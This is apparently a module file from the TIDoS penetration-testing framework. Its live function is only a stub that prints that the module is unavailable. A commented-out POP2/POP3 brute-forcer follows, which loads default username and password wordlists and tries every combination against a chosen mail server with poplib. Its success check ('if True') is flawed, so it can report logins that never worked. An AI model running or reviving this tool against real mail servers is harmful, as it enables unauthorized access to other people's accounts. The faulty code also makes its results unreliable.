#!/usr/bin/env python
from core.colors import color
def popbrute(target):
    print('This module is not yet available.')
    pass
# #!/usr/bin/env python
# #-*- coding: utf-8 -*-

# #-:-:-:-:-:-:-:-:-:-:-:-:#
# #    TIDoS Framework     #
# #-:-:-:-:-:-:-:-:-:-:-:-:#

# #This module requires TIDoS Framework
# #https://github.com/0xInfection/TIDoS-Framework

# from __future__ import print_function
# import poplib
# import time
# import socket
# from core.Core.colors import *

# popuser = []
# poppass = []

# def popbrute(web):

#     print(R+'\n   ===================================')
#     print(R+'    P O P 2/3   B R U T E F O R C E R')
#     print(R+'   ===================================\n')
#     try:
#         print(GR+' [*] Testing target...')
#         time.sleep(0.5)
#         ip = socket.gethostbyname(web)

#         m = raw_input(O+' [#] Use IP '+R+str(ip)+O+'? (y/n) :> ')
#         if m == 'y' or m == 'Y':
#             pass
#         elif m == 'n' or m == 'N':
#             ip = raw_input(O+' [#] Enter IP :> ')

#         print(G+' [+] Target appears online...\n')
#         print(O+' Choose the port number :\n')
#         print(C+'   PORT     PROTOCOL')
#         print(C+'   ====     ========')
#         print(B+'   109        POP2')
#         print(B+'   110        POP3')

#         port = raw_input(GR+'\n [#] Enter the port :> ')
#         pop = poplib.POP3(ip,int(port))
#         print(GR+' [*] Using default credentials...')
#         time.sleep(0.6)
#         print(O+' [!] Importing file paths...')
#         time.sleep(0.8)
#         try:
#             with open('files/brute-db/pop/pop_defuser.lst','r') as users:
#                 for u in users:
#                     u = u.strip('\n')
#                     popuser.append(u)

#             with open('files/brute-db/pop/pop_defpass.lst','r') as pas:
#                 for p in pas:
#                     p = p.strip('\n')
#                     poppass.append(p)
#         except IOError:
#             print(R+' [-] Importing wordlist failed!')

#         for user in popuser:
#             for password in poppass:
#                 try:
#                     pop.user(str(user))
#                     pop.pass_(password)
#                     if True:
#                         print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
#                         break
#                 except:
#                     print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')

#     except:
#         print(R+' [-] Target seems to be down!')
